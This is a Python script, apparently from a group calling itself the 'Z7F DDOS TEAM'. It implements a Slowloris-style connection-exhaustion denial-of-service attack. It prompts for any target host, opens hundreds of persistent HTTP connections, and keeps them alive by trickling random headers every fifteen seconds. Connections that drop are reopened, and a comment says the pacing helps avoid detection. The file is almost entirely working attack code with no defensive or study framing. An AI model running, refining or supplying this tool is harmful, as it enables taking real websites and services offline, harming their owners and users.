import asyncio
import random
import os
import sys

# ألوان Z7F المميزة
R, G, Y, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

def logo():
    os.system('clear')
    print(f"""
{R}  _______ ______ ______      _    _  _  _____  _____   ____   _____ 
{R} |__   __|____  |  ____|    | |  | || ||  __ \|  __ \ / __ \ / ____|
{R}    | |     / /| |__       | |  | || || |  | | |  | | |  | | (___  
{R}    | |    / / |  __|      | |  | || || |  | | |  | | |  | |\___ \ 
{R}    | |   / /  | |         | |__| || || |__| | |__| | |__| |____) |
{R}    |_|  /_/   |_| {W}Z7F     \____/|_||_____/|_____/ \____/|_____/ 
{C}=====================================================================
{Y}        Z7F ADVANCED V4 | ASYNCIO CONNECTION EXHAUSTION
{G}        Rights Reserved: Z7F DDOS TEAM (PRO EDITION)
{C}====================================================================={W}""")

class Z7F_Attack:
    def __init__(self, host, port=80, connections=500):
        self.host = host
        self.port = port
        self.connections = connections
        self.sockets = []
        self.ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
        ]

    async def init_socket(self):
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.host, self.port), timeout=4
            )
            header = f"GET /?{random.randint(0, 5000)} HTTP/1.1\r\n"
            header += f"Host: {self.host}\r\n"
            header += f"User-Agent: {random.choice(self.ua)}\r\n"
            header += f"Accept-language: en-US,en,q=0.5\r\n"
            header += "Connection: keep-alive\r\n"
            
            writer.write(header.encode())
            await writer.drain()
            return reader, writer
        except:
            return None

    async def attack(self):
        print(f"{Y}[*] Establishing {self.connections} persistent connections...{W}")
        
        # إنشاء الاتصالات الأولية
        tasks = [self.init_socket() for _ in range(self.connections)]
        results = await asyncio.gather(*tasks)
        self.sockets = [s for s in results if s is not None]
        
        print(f"{G}[+] Active Connections: {len(self.sockets)}{W}")

        while True:
            print(f"{C}[#] Sending keep-alive headers to {len(self.sockets)} sockets...{W}")
            for i, (reader, writer) in enumerate(self.sockets):
                try:
                    # إرسال هيدر عشوائي لإبقاء الاتصال مفتوحاً واستنزاف السيرفر
                    writer.write(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    await writer.drain()
                except:
                    # إعادة الاتصال في حال السيرفر قطع الاتصال
                    res = await self.init_socket()
                    if res: self.sockets[i] = res
            
            await asyncio.sleep(15) # تأخير لإبقاء الاتصال مفتوحاً دون كشفه سريعاً

async def main():
    logo()
    target = input(f"{G}Target Host (IP/Domain): {W}")
    try:
        conn_count = int(input(f"{G}Number of Connections (Default 500): {W}") or 500)
    except: conn_count = 500

    attack = Z7F_Attack(target, connections=conn_count)
    try:
        await attack.attack()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Attack Interrupted.{W}")

if __name__ == "__main__":
    asyncio.run(main())
